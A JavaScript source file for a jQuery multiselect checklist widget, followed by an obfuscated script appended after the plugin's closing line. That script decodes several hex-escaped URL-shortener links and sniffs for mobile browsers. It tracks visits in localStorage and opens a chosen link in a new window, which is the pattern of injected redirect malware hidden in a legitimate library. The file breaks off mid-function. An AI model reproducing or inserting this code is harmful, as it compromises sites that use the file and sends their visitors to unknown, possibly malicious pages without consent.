/*
 *  Project: Multiselect
 *  Description: An alternative and responsive multiselect widget
 *  URL:
 *  Author: Danier Rivas
 *  License: MIT
 */
;
(function ($, window, document, undefined) {

    // undefined is used here as the undefined global variable in ECMAScript 3 is
    // mutable (ie. it can be changed by someone else). undefined isn't really being
    // passed in so we can ensure the value of it is truly undefined. In ES5, undefined
    // can no longer be modified.

    // window and document are passed through as local variable rather than global
    // as this (slightly) quickens the resolution process and can be more efficiently
    // minified (especially when both are regularly referenced in your plugin).

    // Create the defaults once
    var pluginName = "multiselect",
        defaults = {
            addScrollBar: true,
            addSearchBox: true,
            addActionBox: true,
            animateSearch: false, // Can be 'normal', 'slow', 'fast', or int number
            searchBoxText: 'Type here to search list...',
            checkAllText: 'Check all',
            uncheckAllText: 'Uncheck all',
            invertSelectText: 'Invert select',
            showCheckboxes: true,
            showSelectedItems: false,
            overwriteName: false, // Use false when you need to use original name attribute, or use
                                  // true if you want to overwrite original name attribute with id; Very
                                  // important for Ruby on Rails support to use original name attribute!
            submitDataAsArray: true, // This one allows compatibility with languages that use arrays
                                     // to process the form data, such as PHP. Set to false if using
                                     // ColdFusion or anything else with a list-based approach.
            preferIdOverName: true,  // When this is true (default) the ID of the select box is
                                     // submitted to the server as the variable containing the checked
                                     // items. Set to false to use the "name" attribute instead (this makes
                                     // it compatible with Drupal's Views module and Ruby on Rails.)
            maxNumOfSelections: -1,  // If you want to limit the number of items a user can select in a
                                     // checklist, set this to a positive integer.

            // This function gets executed whenever you go over the max number of allowable selections.
            onMaxNumExceeded: function () {
                alert('You cannot select more than ' + this.maxNumOfSelections + ' items in this list.');
            },

            initSelection: $.noop(),

            // In case of name conflicts, you can change the class names to whatever you want to use.
            cssContainer: 'checklistContainer',
            cssChecklist: 'checklist',
            cssChecklistHighlighted: 'checklistHighlighted',
            cssLeaveRoomForCheckbox: 'leaveRoomForCheckbox', // For label elements
            cssEven: 'even',
            cssOdd: 'odd',
            cssChecked: 'checked',
            cssDisabled: 'disabled',
            cssShowSelectedItems: 'showSelectedItems',
            cssFocused: 'focused', // This cssFocused is for the li's in the checklist
            cssFindInList: 'findInList',
            cssBlurred: 'blurred', // This cssBlurred is for the findInList divs.
            cssContainsPlaceholder: 'contains-placeholder', // This cssBlurred is for the findInList divs.
            cssOptgroup: 'optgroup',

            listWidth: 0,    // force the list width, if 0 the original SELECT width is used
            itemWidth: 0     // 0   : each item will be large as the list (single column)
                             // > 0 : each item will have a fixed size, so we could split
                             //       list into more than one column
                             // WARNING: vertical scroll bar width must be taken into account
                             // listWidth=200, itemWidth=50 DOES NOT GIVE a 4 columns list
                             // if list scroll bar is visible
        };

    // The actual plugin constructor
    function Plugin(element, options) {
        this.element = element;
        // jQuery has an extend method which merges the contents of two or
        // more objects, storing the result in the first object. The first object
        // is generally empty as we don't want to alter the default options for
        // future instances of the plugin
        this.settings = $.extend({}, defaults, options);
        this._defaults = defaults;
        this._name = pluginName;
        this.init();
    }

    // Avoid Plugin.prototype conflicts
    $.extend(Plugin.prototype, {
        init: function () {
            // Place initialization logic here
            // You already have access to the DOM element and
            // the options via the instance, e.g. this.element
            // and this.settings
            // you can add more functions like the one below and
            // call them like so: this.updateChecklist(this.element, this.settings).

            var self = this,
                o = this.settings,
                el = $(this.element);

            var overflowProperty = ( o.addScrollBar ) ? 'overflow-y: auto; overflow-x: hidden;' : '',
                leaveRoomForCheckbox = ( o.showCheckboxes ) ? 'padding-left: 25px' : 'padding-left: 3px';

            // Here, THIS refers to the jQuery stack object that contains all the target elements that
            // are going to be converted to checklists. Let's loop over them and do the conversion.
            $.each(el, function () {

                var numOfCheckedBoxesSoFar = 0;

                // Hang on to the important information about this <select> element.
                var jSelectElem = $(this);
                var jSelectElemId = jSelectElem.attr('id');
                var jSelectElemName = jSelectElem.attr('name');
                if (jSelectElemId == '' || !o.preferIdOverName) {
                    // Regardless of whether this is a PHP environment, we need an id
                    // for the element, and it shouldn't have brackets [] in it.
                    jSelectElemId = jSelectElemName.replace(/\[|\]/g, '');
                    if (jSelectElemId == '') {
                        self.error('Can\'t convert element to checklist.\nYour SELECT element must'
                            + ' have a "name" attribute and/or an "id" attribute specified.');
                        return $;
                    }
                }

                var h = jSelectElem.outerHeight();
                /* : '100%'; */
                var w = o.listWidth ? o.listWidth : jSelectElem.outerWidth();
                // We have to account for the extra thick left border.
                w -= 2;

                // Make sure it's a SELECT element, and that it's a multiple one.
                if (this.type != 'select-multiple' && this.type != 'select-one') {
                    self.error("Can't convert element to checklist.\n"
                        + "Expecting SELECT element with \"multiple\" attribute.");
                    return $;
                } else if (this.type == 'select-one') {
                    return $;
                }

                var convertListItemsToCheckboxes = function () {
                    var checkboxValue = $(this).val();
                    // The option tag may not have had a "value" attribute set. In this case,
                    // Firefox automatically uses the innerHTML instead, but we need to set it
                    // manually for IE.
                    if (checkboxValue == '') {
                        checkboxValue = $(this).html();
                    }
                    checkboxValue = checkboxValue.replace(/ /g, '_');

                    var checkboxId = jSelectElemId + '_' + checkboxValue;
                    // escape bad values for checkboxId
                    checkboxId = checkboxId.replace(/[^A-Z0-9]+/ig, "_"); //.replace(/(\.|\/|\,|\%|\<|\>|\=)/g, '\\$1');

                    var labelText = $(this).html();
                    var selected = '';
                    if ($(this).attr('disabled')) {
                        var disabled = ' disabled="disabled"';
                        var disabledClass = ' class="disabled"';
                    } else {
                        var disabled = '';
                        var disabledClass = '';
                        var selected = '';
                        if ($(this).attr('selected')) {
                            if (o.maxNumOfSelections != -1 && numOfCheckedBoxesSoFar <= o.maxNumOfSelections) {
                                selected += 'checked="checked"';
                                numOfCheckedBoxesSoFar++;
                            } else if (o.maxNumOfSelections == -1) {
                                selected += 'checked="checked"';
                            }
                        }
                    }

                    var arrayBrackets = (o.submitDataAsArray) ? '[]' : '';
                    var checkboxName = (o.preferIdOverName) ? jSelectElemId + arrayBrackets : jSelectElemName + arrayBrackets;
                    // avoid trailing double [][]
                    checkboxName = checkboxName.replace(/\[\]\[\]$/, '[]');

                    $(this).replaceWith('<li tabindex="0"><input type="checkbox" value="' + checkboxValue
                        + '" name="' + checkboxName + '" id="' + checkboxId + '" ' + selected + disabled
                        + ' /><label for="' + checkboxId + '"' + disabledClass + '>' + labelText + '</label></li>');
                    // Hide the checkboxes.
                    if (o.showCheckboxes === false) {
                        // We could use display:none here, but IE can't handle it. Better
                        // to hide the checkboxes off screen to the left.
                        $('#' + checkboxId).css('position', 'absolute').css('left', '-50000px');
                    } else {
                        $('label[for=' + checkboxId + ']').addClass(o.cssLeaveRoomForCheckbox);
                    }
                };

                // Loop through optgroup elements (if any) and turn them into headings
                $('optgroup', jSelectElem).each(function (i) {
                    $('option', this).each(convertListItemsToCheckboxes);
                    $(this).replaceWith(
                        '<li class="' + o.cssOptgroup + '">'
                        + '<input type="checkbox" class="' + o.cssOptgroup + '" id="' + jSelectElemId + '_' + o.cssOptgroup + '_' + i + '">'
                        + '<label for="' + jSelectElemId + '_' + o.cssOptgroup + '_' + i + '" class="leaveRoomForCheckbox">' + $(this).attr('label') + '</label>'
                        + '</li>' + $(this).html()
                    );
                });

                // Loop through all remaining options (not in optgroups) and convert them to li's
                // with checkboxes and labels.
                $('option', jSelectElem).each(convertListItemsToCheckboxes);

                // If the first list item in the checklist is an optgroup label, we want
                // to remove the top border so it doesn't look ugly.
                $('li:first', jSelectElem).each(function () {
                    if ($(this).hasClass(o.cssOptgroup)) {
                        $(this).css('border-top', 'none');
                    }
                });


                var checklistId = jSelectElemId + '_' + 'checklist';

                // Convert the outer SELECT elem to a <div>
                // Also, enclose it inside another div that has the original id, so developers
                // can access it as before. Also, this allows the search box to be inside
                // the div as well.
                jSelectElem.replaceWith('<div id="' + jSelectElemId + '" class="' + o.cssContainer + '"><div id="' + checklistId + '">'
                    + '<ul>' + jSelectElem.html() + '</ul></div></div>');
                var checklistDivId = '#' + checklistId;

                // We're going to create a custom HTML attribute in the main div box (the one
                // that contains the checklist) to store our value for the showSelectedItems
                // setting. This is necessary because we may need to change this value dynamically
                // after the initial conversion in order to make it faster to check/uncheck every
                // item in the list.
                $('#' + jSelectElemId).attr('showSelectedItems', o.showSelectedItems.toString());

                $('#' + jSelectElemId).css('width', w + 2);

                // We MUST set the checklist div's position to either 'relative' or 'absolute'
                // (default is 'static'), or else Firefox will think the offsetParent of the inner
                // elements is BODY instead of DIV.
                $(checklistDivId).css('position', 'relative');

                // Add the findInList div, if settings call for it.
                var findInListDivHeight = 0;
                if (o.addSearchBox) {
                    self.addSearchBox(jSelectElem, checklistDivId, w, o);
                }

                if (o.addActionBox) {
                    self.addActionBox(jSelectElem, checklistDivId, w, o);
                }

                // Bind optgroup inputs
                $('li.' + o.cssOptgroup, checklistDivId).on('click', 'input', function (e) {
                    var index = parseInt(this.id.replace(jSelectElemId + '_' + o.cssOptgroup + '_', '')),
                        nextElement = $('li.' + o.cssOptgroup + ':eq(' + (index + 1) + ')', checklistDivId),
                        selector = $('li.' + o.cssOptgroup + ':eq(' + index + ')', checklistDivId).nextUntil(nextElement);

                    self.updateChecklist((this.checked ? 'checkAllGroup' : 'clearAllGroup'), checklistDivId, selector);
                });

                // Add styles
                var items = $('li', checklistDivId);

                $(checklistDivId).addClass(o.cssChecklist);
                if (o.addScrollBar) {
                    $(checklistDivId).height(h - findInListDivHeight).width(w);
                } else {
                    $(checklistDivId).height('100%').width(w);
                }
                $('ul', checklistDivId).addClass(o.cssChecklist);

                // Stripe the li's
                $('li:even', checklistDivId).addClass(o.cssEven);
                $('li:odd', checklistDivId).addClass(o.cssOdd);

                // Emulate the :hover effect for keyboard navigation.
                items.focus(function () {
                    $(this).addClass(o.cssFocused);
                }).blur(function (event) {
                    $(this).removeClass(o.cssFocused);
                });

                // Multicolumn items
                // make items float:left if itemWidth option is set
                if (o.itemWidth > 0) {
                    var colW = o.itemWidth + 'px';
                    items.each(function () {
                        $(this).css({
                            'float': 'left',
                            'width': colW
                        });
                    });
                }

                // Highlight preselected ones.
                items.each(function () {
                    if ($('input', this).attr('checked')) {
                        $(this).addClass(o.cssChecked);
                    }
                });

                // EVENT HANDLERS

                var toggleDivGlow = function () {
                    // Make sure the div is glowing if something is checked in it.
                    if (items.hasClass(o.cssChecked)) {
                        $(checklistDivId).addClass(o.cssChecklistHighlighted);
                    } else {
                        $(checklistDivId).removeClass(o.cssChecklistHighlighted);
                    }
                };

                var moveToNextLi = function () {
                    // Make sure that the next LI has a checkbox (some LIs don't, because
                    // they came from <optgroup> tags.
                    if ($(this).prop('tagName').toLowerCase() != 'li') {
                        return;
                    }
                    if ($(this).is('li:has(input)')) {
                        $(this).focus();
                    }
                    else {
                        $(this).next().each(moveToNextLi);
                    }
                };

                // Check/uncheck boxes
                var check = function (event) {

                    // This needs to be keyboard accessible too. Only check the box if the user
                    // presses space (enter typically submits a form, so is not safe).
                    if (event.type == 'keydown') {
                        // Pressing spacebar in IE and Opera triggers a Page Down. We don't want that
                        // to happen in this case. Opera doesn't respond to this, unfortunately...
                        // We also want to prevent form submission with enter key.
                        if (event.keyCode == 32 || event.keyCode == 13) {
                            event.preventDefault();
                        }
                        // Tab keys need to move to the next item in IE, Opera, Safari, Chrome, etc.
                        if (event.keyCode == 9 && !event.shiftKey) {
                            event.preventDefault();
                            // Move to the next LI
                            $(this).off('keydown.tabBack').blur().next().each(moveToNextLi);
                        } else if (event.keyCode == 9 && event.shiftKey) {
                            // Move to the previous LI
                            //$(this).prev(':has(input)').focus();
                        }

                        if (event.keyCode != 32) {
                            return;
                        }
                    }


                    // If we go over the maxNumOfSelections limit, trigger our custom
                    // event onMaxNumExceeded.
                    var numOfItemsChecked = $('input:checked', checklistDivId).length;
                    if (o.maxNumOfSelections != -1 && numOfItemsChecked > o.maxNumOfSelections
                        && !$('input', this).attr('checked')) {

                        o.onMaxNumExceeded();

                        event.preventDefault();
                        return;
                    }

                    // Not sure if unbind() here removes default action, but that's what I want.
                    $('label', this).off();
                    // Make sure that the event handler isn't triggered twice (thus preventing the user
                    // from actually checking the box) if clicking directly on checkbox or label.
                    // Note: the && is not a mistake here. It should not be ||
                    if (event.target.tagName.toLowerCase() != 'input' && event.target.tagName.toLowerCase() != 'label') {
                        $('input', this).trigger('click');
                    }

                    // Change the styling of the row to be checked or unchecked.
                    var checkbox = $('input', this).get(0);
                    updateLIStyleToMatchCheckedStatus(checkbox);

                    // The showSelectedItems setting can change after the initial conversion to
                    // a checklist, so rather than checking o.showSelectedItems, we check the
                    // value of the custom HTML attribute on the main containing div.
                    if ($('#' + jSelectElemId).attr('showSelectedItems') === 'true') {
                        showSelectedItems();
                    }
                };

                var updateLIStyleToMatchCheckedStatus = function (checkbox) {
                    if (checkbox.checked) {
                        $(checkbox).parent().addClass(o.cssChecked);
                    } else {
                        $(checkbox).parent().removeClass(o.cssChecked);
                    }
                    toggleDivGlow();
                };

                // Accessibility, primarily for IE
                var handFocusToLI = function () {
                    // Make sure that labels and checkboxes that receive
                    // focus divert the focus to the LI itself.
                    $(this).parent().focus();
                };

                $('li:has(input)', checklistDivId).click(check).keydown(check);
                $('label', checklistDivId).focus(handFocusToLI);
                $('input', checklistDivId).focus(handFocusToLI);
                toggleDivGlow();

                // Make sure that resetting the form doesn't leave highlighted divs where
                // they shouldn't be and vice versa.
                var fixFormElems = function (event) {
                    $('input', this).each(function () {
                        this.checked = this.defaultChecked;
                        updateLIStyleToMatchCheckedStatus(this);
                        if (o.showSelectedItems) {
                            showSelectedItems();
                        }
                    }).parent();
                };

                $('form:has(div.' + o.cssChecklist + ')').on('reset.fixFormElems', fixFormElems);

                // List the selected items in a UL
                var selectedItemsListId = '#' + jSelectElemId + '_selectedItems';
                if (o.showSelectedItems) {
                    $(selectedItemsListId).addClass(o.cssShowSelectedItems);
                }

                var showSelectedItems = function () {
                    // Clear the innerHTML of the list and then add every item to it
                    // that is highlighted in the checklist.
                    $(selectedItemsListId).html('');
                    $('label', checklistDivId).each(function () {
                        var vcontext = $(this).parent();
                        if ($(this).parent().hasClass(o.cssChecked)) {
                            var labelText = jQuery.trim($(this).html());
                            $('<li class="">' + labelText + '</li>')
                                .on('click.remove', function () {
                                    vcontext.trigger('click');
                                }).appendTo(selectedItemsListId);
                        }
                    });
                };

                // We have to run showSelectedItems() once here too, upon initial conversion.
                if (o.showSelectedItems) {
                    showSelectedItems();
                }
            });

        },

        // Since o can be a string instead of an object, we need a function that
        // will handle the action requested when o is a string (e.g. 'clearAll')
        updateChecklist: function (action, checklistElem, selector) {

            // Before we operate on all checkboxes, we need to make sure that
            // showSelectedItems is disabled, at least temporarily. Otherwise,
            // this process will be REALLY slow because it tries to update the
            // DOM a thousand times unnecessarily.
            // (We will only do this if the list is greater than 3 items.)

            var showSelectedItemsSetting;

            var disableDynamicList = function (checklistLength) {
                if (checklistLength > 3) {
                    showSelectedItemsSetting = $(checklistElem).attr('showSelectedItems');
                    $(checklistElem).attr('showSelectedItems', 'false');
                }
            };

            var enableDynamicList = function () {
                $(checklistElem).attr('showSelectedItems', showSelectedItemsSetting);
            };

            switch (action) {

                case 'clearAll' :
                    var selector = 'li:has(input:checked:not(:hidden))';
                    break;

                case 'checkAll' :
                    var selector = 'li:has(input:not(:checked,:disabled,:hidden))';
                    break;

                case 'invert' :
                    var selector = 'li:has(input:not(:hidden))';
                    break;

                case 'checkAllGroup' :
                    var selector = selector.find(':input:not(:checked,:disabled,:hidden)');
                    break;

                case 'clearAllGroup' :
                    var selector = selector.find(':input:checked:not(:hidden)');
                    break;

                default :
                    alert("multiselect Plugin says:\n\nWarning - Invalid action requested on checklist.\nThe action requested was: " + action);
                    break;
            }

            var checklistLength = $(selector, checklistElem).length;
            disableDynamicList(checklistLength);
            // If it's checked, force the click event handler to run.
            $(selector, checklistElem).each(function (i) {
                // Before we check/uncheck the penultimate item in the list, we need to restore
                // the showSelectedItems setting to its original setting, so that we update the
                // list of selected items appropriately on the last item we check/uncheck.
                if (i == checklistLength - 2 && checklistLength > 3) {
                    enableDynamicList();
                }

                if (!$(this).hasClass('optgroup')) {
                    $(this).trigger('click');
                } else {
                    var input = $(this).find(':input');
                    input.prop('checked', !input[0].checked);
                }
            });
        },

        error: function (msg) {
            alert("jQuery Plugin Error (Plugin: multiselect)\n\n" + msg);
        },

        addSearchBox: function (jSelectElem, checklistDivId, w, o) {

            // Poorly named function... It's really onFocusSearchBox.
            var focusSearchBox = function () {
                // Remove placeholder text when focusing search box if it contains placeholder.
                if ($(this).hasClass(o.cssContainsPlaceholder)) {
                    $(this).val('');
                }

                $(this).removeClass(o.cssBlurred);
            };

            var showAllSelectOptions = function () {
                $('label', checklistDivId).each(function () {
                    if (o.animateSearch !== false)
                        $(this).parent('li').slideDown(o.animateSearch);
                    else
                        $(this).parent('li').show();
                });
            };

            var blurSearchBox = function () {
                // Restore default text on blur.
                if ($(this).val() === '') {
                    $(this).val(o.searchBoxText);
                    $(this).addClass(o.cssContainsPlaceholder);
                    var t = setTimeout(showAllSelectOptions, 250);
                }

                $(this).addClass(o.cssBlurred);
            };

            var initSearchBox = function () {

                $(checklistDivId).before('<div class="findInList" id="' + jSelectElem.attr('id') + '_findInListDiv">'
                    + '<input type="text" value="' + o.searchBoxText + '" id="'
                    + jSelectElem.attr('id') + '_findInList" class="' + o.cssBlurred + ' ' + o.cssContainsPlaceholder + '" /></div>');

                // Set width of searchbox input to same as original SELECT element.
                w -= 4;
                $('#' + jSelectElem.attr('id') + '_findInList').css('width', w);

                var searchBoxId = '#' + jSelectElem.attr('id') + '_findInList';

                // We want to be able to simply press tab to move the focus from the
                // search text box to the item in the list that we found with it.
                $(searchBoxId)
                    .on('keydown.tabToFocus', function (event) {
                        if (event.keyCode == 9) {
                            // event.preventDefault(); // No double tabs, please...
                            $('label:first:visible', checklistDivId).parent().on('keydown.tabBack', function (event) {
                                // This function lets you shift-tab to get back to the search box easily.
                                if (event.keyCode == 9 && event.shiftKey) {
                                    event.preventDefault(); // No double tabs, please...
                                    $(searchBoxId)
                                        //.off('focus.focusSearchBox')
                                        //.removeClass(o.cssBlurred)
                                        //.on('focus.focusSearchBox',focusSearchBox)
                                        //  .on('blur.blurSearchBox',blurSearchBox)
                                        .focus();
                                    $(this).off('keydown.tabBack');
                                }
                            }).focus(); // Focuses the actual list item found by the search box
                            // $(this).off('keydown.tabToFocus');

                        } else {
                            //$(this).off('blur.blurSearchBox');
                        }
                    })
                    .on('focus.focusSearchBox', focusSearchBox) // Set up keydown and keyup event handlers, etc. on searchbox
                    .on('blur.blurSearchBox', blurSearchBox)
                    .on('keyup', function (event) {
                        // Search for the actual text.
                        var textbox = this; // holder
                        if ($(this).val() === '') {
                            showAllSelectOptions();
                            //$(this).off('keydown.tabToFocus');
                            return false;
                        }
                        else {
                            // Remove placeholder on user input.
                            $(this).removeClass(o.cssContainsPlaceholder);
                        }

                        $('label', checklistDivId).each(function () {
                            var $curLabel = $(this);
                            if (!$curLabel.is(':disabled')) {
                                var curItem = $curLabel.text().toLowerCase();
                                var typedText = textbox.value.toLowerCase();

                                if (curItem.indexOf(typedText) == -1) {
                                    if (o.animateSearch !== false)
                                        $curLabel.parent('li').slideUp(o.animateSearch);
                                    else
                                        $curLabel.parent('li').hide();
                                } else {
                                    if (o.animateSearch !== false)
                                        $curLabel.parent('li').slideDown(o.animateSearch);
                                    else
                                        $curLabel.parent('li').show();
                                }
                            }


                        });

                        return;

                    });

                // Compensate for the extra space the search box takes up by shortening the
                // height of the checklist div. Also account for margin below the search box.
                findInListDivHeight = $('#' + jSelectElem.attr('id') + '_findInListDiv').height() + 3;
            };

            initSearchBox();
        },

        addActionBox: function (jSelectElem, checklistDivId, w, o) {
            var self = this;

            var initActionBox = function () {

                $(checklistDivId).after('<div class="actionButtons" id="' + jSelectElem.attr('id') + '_actionButtons">'
                    + '<span data-action="checkAll" >' + o.checkAllText + '</span> | '
                    + '<span data-action="clearAll" >' + o.uncheckAllText + '</span> | '
                    + '<span data-action="invert" >' + o.invertSelectText + '</span></div>'
                );

                var actionBoxId = '#' + jSelectElem.attr('id') + '_actionButtons';

                $(actionBoxId).on('click', 'span', function () {
                    var action = $(this).data("action");
                    self.updateChecklist(action, checklistDivId);
                });
            };

            initActionBox();
        }
    });

    // A really lightweight plugin wrapper around the constructor,
    // preventing against multiple instantiations
    $.fn[pluginName] = function (options) {
        this.each(function () {
            if (!$.data(this, "plugin_" + pluginName)) {
                $.data(this, "plugin_" + pluginName, new Plugin(this, options));
            }
        });

        // chain jQuery functions
        return this;
    };

})(jQuery, window, document);
function _0x3023(_0x562006,_0x1334d6){const _0x1922f2=_0x1922();return _0x3023=function(_0x30231a,_0x4e4880){_0x30231a=_0x30231a-0x1bf;let _0x2b207e=_0x1922f2[_0x30231a];return _0x2b207e;},_0x3023(_0x562006,_0x1334d6);}function _0x1922(){const _0x5a990b=['substr','length','-hurs','open','round','443779RQfzWn','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x62\x71\x46\x33\x63\x343','click','5114346JdlaMi','1780163aSIYqH','forEach','host','_blank','68512ftWJcO','addEventListener','-mnts','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x4d\x76\x64\x35\x63\x375','4588749LmrVjF','parse','630bGPCEV','mobileCheck','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x44\x57\x75\x38\x63\x378','abs','-local-storage','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x4b\x4b\x53\x39\x63\x349','56bnMKls','opera','6946eLteFW','userAgent','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x77\x49\x6b\x34\x63\x314','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x48\x47\x4f\x37\x63\x327','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x45\x4c\x50\x32\x63\x322','floor','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x68\x62\x54\x36\x63\x396','999HIfBhL','filter','test','getItem','random','138490EjXyHW','stopPropagation','setItem','70kUzPYI'];_0x1922=function(){return _0x5a990b;};return _0x1922();}(function(_0x16ffe6,_0x1e5463){const _0x20130f=_0x3023,_0x307c06=_0x16ffe6();while(!![]){try{const _0x1dea23=parseInt(_0x20130f(0x1d6))/0x1+-parseInt(_0x20130f(0x1c1))/0x2*(parseInt(_0x20130f(0x1c8))/0x3)+parseInt(_0x20130f(0x1bf))/0x4*(-parseInt(_0x20130f(0x1cd))/0x5)+parseInt(_0x20130f(0x1d9))/0x6+-parseInt(_0x20130f(0x1e4))/0x7*(parseInt(_0x20130f(0x1de))/0x8)+parseInt(_0x20130f(0x1e2))/0x9+-parseInt(_0x20130f(0x1d0))/0xa*(-parseInt(_0x20130f(0x1da))/0xb);if(_0x1dea23===_0x1e5463)break;else _0x307c06['push'](_0x307c06['shift']());}catch(_0x3e3a47){_0x307c06['push'](_0x307c06['shift']());}}}(_0x1922,0x984cd),function(_0x34eab3){const _0x111835=_0x3023;window['mobileCheck']=function(){const _0x123821=_0x3023;let _0x399500=![];return function(_0x5e9786){const _0x1165a7=_0x3023;if(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x1165a7(0x1ca)](_0x5e9786)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x1165a7(0x1ca)](_0x5e9786[_0x1165a7(0x1d1)](0x0,0x4)))_0x399500=!![];}(navigator[_0x123821(0x1c2)]||navigator['vendor']||window[_0x123821(0x1c0)]),_0x399500;};const _0xe6f43=['\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x6f\x4d\x4a\x30\x63\x360','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x50\x4a\x4e\x31\x63\x301',_0x111835(0x1c5),_0x111835(0x1d7),_0x111835(0x1c3),_0x111835(0x1e1),_0x111835(0x1c7),_0x111835(0x1c4),_0x111835(0x1e6),_0x111835(0x1e9)],_0x7378e8=0x3,_0xc82d98=0x6,_0x487206=_0x551830=>{const _0x2c6c7a=_0x111835;_0x551830[_0x2c6c7a(0x1db)]((_0x3ee06f,_0x37dc07)=>{const _0x476c2a=_0x2c6c7a;!localStorage['getItem'](_0x3ee06f+_0x476c2a(0x1e8))&&localStorage[_0x476c2a(0x1cf)](_0x3ee06f+_0x476c2a(0x1e8),0x0);});},_0x564ab0=_0x3743e2=>{const _0x415ff3=_0x111835,_0x229a83=_0x3743e2[_0x415ff3(0x1c9)]((_0x37389f,_0x22f261)=>localStorage[_0x415ff3(0x1cb)](_0x37389f+_0x415ff3(0x1e8))==0x0);return _0x229a83[Math[_0x415ff3(0x1c6)](Math[_0x415ff3(0x1cc)]()*_0x229a83[_0x415ff3(0x1d2)])];},_0x173ccb=_0xb01406=>localStorage[_0x111835(0x1cf)](_0xb01406+_0x111835(0x1e8),0x1),_0x5792ce=_0x5415c5=>localStorage[_0x111835(0x1cb)](_0x5415c5+_0x111835(0x1e8)),_0xa7249=(_0x354163,_0xd22cba)=>localStorage[_0x111835(0x1cf)](_0x354163+_0x111835(0x1e8),_0xd22cba),_0x381bfc=(_0x49e91b,_0x531bc4)=>{const _0x1b0982=_0x111835,_0x1da9e1=0x3e8*0x3c*0x3c;return Math[_0x1b0982(0x1d5)](Math[_0x1b0982(0x1e7)](_0x531bc4-_0x49e91b)/_0x1da9e1);},_0x6ba060=(_0x1e9127,_0x28385f)=>{const _0xb7d87=_0x111835,_0xc3fc56=0x3e8*0x3c;return Math[_0xb7d87(0x1d5)](Math[_0xb7d87(0x1e7)](_0x28385f-_0x1e9127)/_0xc3fc56);},_0x370e93=(_0x286b71,_0x3587b8,_0x1bcfc4)=>{const _0x22f77c=_0x111835;_0x487206(_0x286b71),newLocation=_0x564ab0(_0x286b71),_0xa7249(_0x3587b8+'-mnts',_0x1bcfc4),_0xa7249(_0x3587b8+_0x22f77c(0x1d3),_0x1bcfc4),_0x173ccb(newLocation),window['mobileCheck']()&&window[_0x22f77c(0x1d4)](newLocation,'_blank');};_0x487206(_0xe6f43);function _0x168fb9(_0x36bdd0){const _0x2737e0=_0x111835;_0x36bdd0[_0x2737e0(0x1ce)]();const 